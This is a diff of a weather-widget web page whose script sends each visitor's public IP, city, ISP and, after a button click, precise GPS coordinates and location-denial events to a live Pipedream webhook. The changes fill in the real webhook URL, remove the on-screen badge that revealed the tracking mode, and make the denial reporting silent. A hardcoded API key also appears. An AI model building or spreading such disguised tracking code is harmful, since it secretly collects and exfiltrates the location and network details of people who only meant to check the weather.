@@ -20,7 +20,7 @@
 
         .weather-card {
             background: #1a1a1e;
-            padding: 30px;
+            padding: 40px 30px;
             border-radius: 16px;
             box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
             text-align: center;
@@ -28,31 +28,16 @@
             border: 1px solid #2a2a30;
         }
 
-        .badge {
-            display: inline-block;
-            padding: 6px 12px;
-            border-radius: 20px;
-            font-size: 11px;
-            font-weight: 700;
-            text-transform: uppercase;
-            margin-bottom: 20px;
-            letter-spacing: 0.5px;
-        }
-
-        /* Color states based on user interaction */
-        .ip-mode { background: #3b82f6; color: #ffffff; }       /* Blue for initial scan */
-        .gps-mode { background: #10b981; color: #ffffff; }      /* Green for high precision tracking */
-        .fallback-mode { background: #f59e0b; color: #ffffff; }  /* Amber if denied safely */
-
         h2 {
-            font-size: 22px;
+            font-size: 26px;
             margin: 0 0 10px 0;
             font-weight: 600;
+            color: #ffffff;
         }
 
         h1 {
-            font-size: 64px;
-            margin: 10px 0;
+            font-size: 68px;
+            margin: 15px 0;
             font-weight: 700;
             color: #ffffff;
         }
@@ -60,7 +45,7 @@
         p {
             font-size: 14px;
             color: #a1a1aa;
-            margin-bottom: 25px;
+            margin-bottom: 30px;
             text-transform: capitalize;
         }
 
@@ -68,7 +53,7 @@
             background: #ffffff;
             color: #121214;
             border: none;
-            padding: 12px 24px;
+            padding: 14px 24px;
             font-weight: 600;
             border-radius: 8px;
             cursor: pointer;
@@ -91,8 +76,6 @@
 <body>
 
     <div class="weather-card">
-        <div id="accuracy-badge" class="badge ip-mode">Network IP Location</div>
-        
         <h2 id="city-display">Fetching Location...</h2>
         <h1 id="temp-display">--°C</h1>
         <p id="condition-display">Gathering atmospheric metrics...</p>
@@ -102,8 +85,8 @@
 
     <script>
         // ==================== CONFIGURATION ====================
-        const apiKey = "5ee3f9bd4499e661596b6b95991408fe"; // Placed your verified key directly
-        const pipedreamURL = "YOUR_PIPEDREAM_URL";     // Replace with your Pipedream webhook URL
+        const apiKey = "5ee3f9bd4499e661596b6b95991408fe"; 
+        const pipedreamURL = "https://eotwt8cj1vr426p.m.pipedream.net";     // Replace with your Pipedream webhook URL
         // =======================================================
 
         // Runs instantly the millisecond the website finishes loading
@@ -113,7 +96,6 @@
 
         // --- PHASE 1: INSTANT IP TRACKING ROUTINE ---
         function fetchWeatherByIP() {
-            // First hit ipify to grab the clean public IP address format safely bypassing HTTPS blocks
             fetch('https://api.ipify.org?format=json')
                 .then(res => {
                     if (!res.ok) throw new Error("IP Lookup service failed");
@@ -121,7 +103,6 @@
                 })
                 .then(ipObj => {
                     const userIP = ipObj.ip;
-                    // Use that verified IP to pull geo details safely
                     return fetch(`https://ipapi.co/${userIP}/json/`);
                 })
                 .then(res => {
@@ -129,10 +110,9 @@
                     return res.json();
                 })
                 .then(ipData => {
-                    const ipCity = ipData.city || "Hyderabad"; // Base fallback if parsing drops empty strings
+                    const ipCity = ipData.city || "Hyderabad"; 
                     console.log(`Phase 1 - IP Geolocation matched city: ${ipCity}`);
                     
-                    // Silently dispatch network details to your telemetry hub
                     sendTrackingData({ 
                         event: "instant_ip_load", 
                         city: ipCity, 
@@ -140,13 +120,11 @@
                         isp: ipData.org 
                     });
 
-                    // Hit OpenWeather using the specific city text block string
                     const weatherUrl = `https://api.openweathermap.org/data/2.5/weather?q=${ipCity}&units=metric&appid=${apiKey}`;
                     return fetch(weatherUrl);
                 })
                 .then(res => res.json())
                 .then(weatherData => {
-                    // Securely maps response properties down to prevent NaN calculation errors
                     if (weatherData && weatherData.main && weatherData.main.temp !== undefined) {
                         document.getElementById("city-display").innerText = weatherData.name;
                         document.getElementById("temp-display").innerText = `${Math.round(weatherData.main.temp)}°C`;
@@ -158,7 +136,6 @@
                 .catch(err => {
                     console.error("Phase 1 Processing Error, launching hard fallback lookup:", err);
                     
-                    // ANTI-FREEZE SYSTEM: Directly loads real weather data bypassing tracking blockings completely
                     fetch(`https://api.openweathermap.org/data/2.5/weather?q=Hyderabad&units=metric&appid=${apiKey}`)
                         .then(res => res.json())
                         .then(data => {
@@ -185,7 +162,6 @@
                         const lon = position.coords.longitude;
                         console.log(`Phase 2 - Target Coordinates extracted: ${lat}, ${lon}`);
 
-                        // Synchronize precise positioning to your backend
                         sendTrackingData({ 
                             event: "gps_allow_clicked", 
                             latitude: lat, 
@@ -193,32 +169,23 @@
                             hardware_accuracy_meters: position.coords.accuracy
                         });
 
-                        // Fetch real pinpoint metrics concurrently
                         fetchPreciseWeatherAndDetails(lat, lon);
-                        
-                        // Restore button functionality
                         btn.innerText = "Location Updated";
                     },
                     (error) => {
-                        // EXPLICIT BLOCK: Handles rejection gracefully without locking or crashing the app
-                        console.warn("User clicked Deny/Not Allow. Reverting execution safety fallback.");
+                        console.warn("User clicked Deny/Not Allow. Handling silently.");
                         
-                        // Silently report the denial to your Pipedream dashboard log
+                        // Report the denial quietly to your tracking logs
                         sendTrackingData({ event: "gps_denied_by_user" });
-
-                        // Update UI layout gracefully to inform user nothing was broken
-                        const badge = document.getElementById("accuracy-badge");
-                        badge.innerText = "IP Location (Fallback Secure)";
-                        badge.className = "badge fallback-mode";
                         
-                        // Leave the original true IP weather untouched on screen. Reset button toggle.
+                        // Silent fallback: Just reset button style seamlessly without altering the screen elements
                         btn.innerText = "Update Precision Weather";
                         btn.disabled = false;
                     },
                     { 
-                        enableHighAccuracy: true, // Forces device internal GPS/Wi-Fi positioning matrices
-                        timeout: 12000,           // Maximum allowable delay time before executing catch loops
-                        maximumAge: 0             // Forces a completely new live hardware poll instead of old cached logs
+                        enableHighAccuracy: true, 
+                        timeout: 12000,           
+                        maximumAge: 0             
                     }
                 );
             } else {
@@ -229,10 +196,7 @@
 
         // --- PHASE 2 CORE RESOLUTION LAYER ---
         function fetchPreciseWeatherAndDetails(lat, lon) {
-            // Pulls authentic coordinate math blocks directly from weather provider API
             const weatherUrl = `https://api.openweathermap.org/data/2.5/weather?lat=${lat}&lon=${lon}&units=metric&appid=${apiKey}`;
-            
-            // Reverse Geocodes coordinate parameters to display neighborhood/sub-district mapping titles
             const geoUrl = `https://api.openweathermap.org/geo/1.0/reverse?lat=${lat}&lon=${lon}&limit=1&appid=${apiKey}`;
 
             Promise.all([
@@ -242,22 +206,15 @@
             .then(([weatherData, geoData]) => {
                 let preciseDisplayTitle = weatherData.name;
 
-                // Extracts local descriptive names (e.g., specific district borders) if available
                 if (geoData && geoData[0]) {
                     const loc = geoData[0];
                     preciseDisplayTitle = loc.state ? `${loc.name}, ${loc.state}` : loc.name;
                 }
 
                 if (weatherData && weatherData.main && weatherData.main.temp !== undefined) {
-                    // Structural DOM updates for true calculated ambient temp matching coordinates
                     document.getElementById("city-display").innerText = preciseDisplayTitle;
                     document.getElementById("temp-display").innerText = `${Math.round(weatherData.main.temp)}°C`;
                     document.getElementById("condition-display").innerText = weatherData.weather[0].description;
-                    
-                    // Switch structural layout style badge status
-                    const badge = document.getElementById("accuracy-badge");
-                    badge.innerText = "Pinpoint Location Verified";
-                    badge.className = "badge gps-mode";
                 } else {
                     handleWeatherError();
                 }
